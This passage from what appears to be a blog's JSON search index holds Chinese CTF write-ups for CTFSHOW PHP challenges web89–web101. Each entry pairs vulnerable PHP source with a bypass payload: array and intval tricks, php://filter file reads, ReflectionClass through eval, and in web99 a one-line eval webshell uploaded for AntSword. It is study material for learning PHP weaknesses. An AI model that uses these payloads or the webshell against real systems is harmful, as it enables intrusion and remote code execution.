ls&#39;));\n\nFilesystemIterator类读取文件\nFilesystemIterator获取指定目录下的所有文件\ngetcwd()函数：获取当前工作目录 返回当前工作目录\n\nFilesystemIterator(getcwd());\nPHP变量$GLOBALSfunction getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);//$v1和$v2指向同一地址，此时$v1=$v2    var_dump($$v1);&#125;\n\npayload: v1=ctfshow&amp;v2=GLOBALS  //构成$GLOBALS\nget_defined_vars()\n返回由所有已定义变量所组成的数组\n变量包括环境变量、服务器变量和用户定义的变量\n\nvar_dump(get_defined_vars())\n变量命名\nPHP变量命名规则：只能包含：字母、数字、下划线其中，只能以字母、下划线开头\n\nif(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;\nphp变量命名不允许出现 .（点号）,需要绕过’CTF_SHOW.COM’\nGET或POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _\n特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了 因此：\nCTF[SHOW.COM =&gt; CTF_SHOW.COM\n","categories":["网络安全"],"tags":["web安全"]},{"title":"CTFSHOW_web","url":"/post/98cc0853.html","content":"\n\nPHP特性web89if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num[]=1\n\npreg_match()：只能处理字符串，当传入的是数组时会返回false\nintval()：变量不能是array和object格式  成功时返回var的integer值，失败时返回0，空的array返回0，非空的array返回1\n\nweb90if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\npayload: ?num=4476[a-z or .!@$%^\\()等]\n\nintval()：如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是 - ，则从第二个开始算起\n===：在进行比较的时候，会先判断两种字符串的类型是否相等，再比较\n\nweb91$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;no no no no no&#x27;;&#125;\n\npayload: ?cmd=%0aphp\n\n/^php$/：正则表达式，匹配开始和结束位置，简单来说就是参数值为php\ni：不区分大小写\nm：多行匹配\n\nweb92if (isset($_GET[&#x27;num&#x27;])) &#123;    $num = $_GET[&#x27;num&#x27;];    if ($num == 4476) &#123;        die(&quot;no no no!&quot;);    &#125;    if (intval($num, 0) == 4476) &#123;        echo $flag;    &#125; else &#123;        echo intval($num, 0);    &#125;&#125;\n\npayload: ?num=010574 or 4476e1\n\n==：在进行比较的时候，会先将字符串类型转化成相同类型，再比较\n\nweb93if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\npayload: ?num=010574\n\nintval():  第二个参数为0时，通过对变量检测来判断\n0b??：二进制\n0???：八进制\n0x??：十六进制\n\n\n\nweb94if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num= 010574\n\nstrpos()：返回在字符串首次出现的位置，如果没找到返回false\n\nweb95if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num= 010574\nweb96if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125;\n\npayload: ?u=php://filter/resource=flag.php\n\nhighlight_file()：打印输出或者返回文件中语法高亮版本的代码\n利用伪协议读取文件内容\n\nweb97if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;\n\npayload: a[]=1&amp;b[]=1\n\nmd5强比较，数组绕过\n原理：md5()参数为数组时，不会报错，返回值为null\n\nweb98$flag=&quot;flag is here&quot;;$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);\n\npayload: HTTP_FLAG=flag\n\n=&amp;：值或对象都将指向相同的数据    引用\nget和post都指向相同的数据，而get又与cookie和server指向相同的数据，但题要求用get传参，所以使用post传参来替代get传参\n\nweb99$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;    array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;\n\npayload: ?n=1.php content=&lt;?php eval($_POST[&#39;x&#39;]);?&gt; 蚁剑连接\n\narray_push()：将一个或者多个数据存入数组中\nin_array()：检查数组中是否存在某个值 \nfile_put_contents()：将数据写入文件中\n\n\n当in_array()检查的数据为数字加字符串时，会截取第一个非数字字符前的所有数字作为检查的对象，所以可以传1.php，在该函数中表现的是检测1是否存在，这样就绕过了该函数\n写入文件的内容是什么呢？目的是为了获得路径，读取目录，进而得到flag所以可以写入一句话木马，用蚁剑连接，获得flag\n\nweb100//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\npayload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n根据提示，得出flag在ctfshow()类中\n在外层if判断只需让v0为真即可，v0为真，只需让is_numeric($v1)为真即可\n第二层if判断中，不能有;，第三层if中必须有;\n根据php特性中的反射类相关知识，构造一个反射类，将ctfshow()相关信息，用echo打印出来即可\n\nweb101$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125; \n\npayload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n正则过滤了一大堆东西，实际上payload跟上个题一样\n\n","categories":["网络安全"],"tags":["CTFSHOW_wp"]}]